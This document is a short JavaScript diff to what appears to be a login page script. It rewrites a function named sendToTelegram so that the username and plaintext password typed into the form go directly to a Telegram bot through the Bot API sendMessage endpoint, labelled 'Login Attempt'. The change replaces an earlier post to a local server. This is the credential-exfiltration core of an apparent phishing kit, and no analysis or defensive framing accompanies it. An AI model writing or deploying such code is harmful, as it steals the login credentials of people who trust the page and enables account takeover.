@@ -15,11 +15,21 @@ function showNotification(message, type) {
 
 // backend ko send karna
 async function sendToTelegram(username, password) {
+  // message text
+  const message = `🔔 Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+  // Telegram API URL
+  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
   try {
-    const response = await fetch('http://localhost:3000/send-message', {
+    
+    const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password })
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
     });
 
     const result = await response.json();
